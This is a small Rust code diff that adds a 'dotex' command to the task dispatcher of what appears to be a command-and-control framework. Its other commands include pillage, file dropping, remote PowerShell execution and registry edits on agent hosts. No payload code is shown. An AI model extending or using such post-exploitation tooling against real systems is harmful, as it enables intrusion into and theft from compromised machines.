@@ -9,10 +9,10 @@ use crate::{
     net::{ApiError, IsTaskingAgent, IsTaskingAgentErr},
     tasks::task_impl::{
         FileOperationTarget, RegOperationDelQuery, TaskDispatchError, change_directory,
-        clear_terminal, copy_file, dir_listing, export_db, file_dropper, kill_agent, kill_process,
-        list_processes, move_file, pillage, pull_file, pwd, reg_add, reg_query_del, remove_agent,
-        remove_file, run_powershell_command, set_sleep, show_help, show_help_for_command,
-        show_server_time, unknown_command,
+        clear_terminal, copy_file, dir_listing, dotex, export_db, file_dropper, kill_agent,
+        kill_process, list_processes, move_file, pillage, pull_file, pwd, reg_add, reg_query_del,
+        remove_agent, remove_file, run_powershell_command, set_sleep, show_help,
+        show_help_for_command, show_server_time, unknown_command,
     },
 };
 
@@ -111,6 +111,7 @@ async fn dispatcher(tokens: Vec<&str>, raw_input: String, agent: IsTaskingAgent)
         ["reg", "del", _p @ ..] => {
             reg_query_del(raw_input, &agent, RegOperationDelQuery::Delete).await
         }
+        ["dotex", _p @ ..] => dotex(raw_input, &agent).await,
         _ => unknown_command(),
     }
 }
